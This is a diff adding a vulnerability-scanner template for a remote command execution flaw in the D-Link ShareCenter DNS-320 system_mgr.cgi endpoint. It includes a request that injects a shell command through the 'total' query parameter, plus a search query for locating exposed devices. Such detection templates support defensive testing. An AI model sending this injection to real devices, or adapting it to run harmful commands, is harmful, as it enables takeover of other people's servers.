@@ -1,0 +1,17 @@
+name: D-Link ShareCenter DNS-320 RCE
+manual: true
+query: app="D_Link-DNS-ShareCenter"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;pwd;
+    expression: response.status == 200 && response.body.bcontains(b"var/www")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  description: D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器
+  tags: RCE
